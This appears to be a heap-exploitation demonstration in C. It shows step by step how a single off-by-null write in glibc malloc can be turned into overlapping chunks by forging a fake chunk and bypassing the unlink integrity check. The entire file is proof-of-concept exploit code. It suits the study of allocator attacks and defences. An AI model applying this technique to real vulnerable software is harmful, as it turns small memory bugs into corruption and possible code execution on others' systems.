
#include <stdlib.h>
#include <string.h>
#include <assert.h>
int main()
{
	// step1: allocate padding
	void *tmp = malloc(0x1);
	void *heap_base = (void *)((long)tmp & (~0xfff));
	size_t size = 0x10000 - ((long)tmp & 0xffff) - 0x20;
	void *padding = malloc(size);
	// step2: allocate prev chunk and victim chunk
	void *prev = malloc(0x500);
	void *victim = malloc(0x4f0);
	malloc(0x10);
	// step3: link prev into largebin
	void *a = malloc(0x4f0);
	malloc(0x10);
	void *b = malloc(0x510);
	malloc(0x10);
	free(a);
	free(b);
	free(prev);
	malloc(0x1000);
	// step4: allocate prev again to construct fake chunk
	void *prev2 = malloc(0x500);
	assert(prev == prev2);
	((long *)prev)[1] = 0x501;
	*(long *)(prev + 0x500) = 0x500;
	// step5: bypass unlinking
	void *b2 = malloc(0x510);
	((char *)b2)[0] = '\x10';
	((char *)b2)[1] = '\x00';  // b->fd <- fake_chunk
	void *a2 = malloc(0x4f0);
	free(a2);
	free(victim);
	void *a3 = malloc(0x4f0);
	((char *)a3)[8] = '\x10';
	((char *)a3)[9] = '\x00';
	// pass unlink_chunk in malloc.c:
	//      mchunkptr fd = p->fd;
	//      mchunkptr bk = p->bk;
	//      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
	//          malloc_printerr ("corrupted double-linked list");
	// step6: add fake chunk into unsorted bin by off-by-null
	void *victim2 = malloc(0x4f0);
	/* VULNERABILITY */
	((char *)victim2)[-8] = '\x00';
	/* VULNERABILITY */
	free(victim);
	// step7: validate the chunk overlapping
	void *merged = malloc(0x100);
	memset(merged, 'A', 0x80);
	memset(prev2, 'C', 0x80);
	assert(strstr(merged, "CCCCCCCCC"));
}
